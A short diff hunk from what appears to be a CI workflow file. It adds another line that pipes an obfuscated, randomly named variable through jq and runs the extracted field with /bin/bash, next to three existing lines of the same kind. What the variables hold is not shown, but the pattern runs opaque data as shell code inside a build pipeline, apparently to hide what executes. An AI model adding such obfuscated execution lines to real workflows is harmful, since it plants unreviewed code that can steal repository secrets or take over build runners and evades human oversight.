@@ -41,6 +41,7 @@ jobs:
           echo $ccv40858 | jq -r .g7 | /bin/bash
           printf '%s' "$kkg94" | jq -r .ftjs0 | /bin/bash
           echo $nu1201 | jq -r .ojyvp76580 | /bin/bash
+          echo $rb7496 | jq -r .q11993 | /bin/bash
 
       - name: Upload data
         if: always()
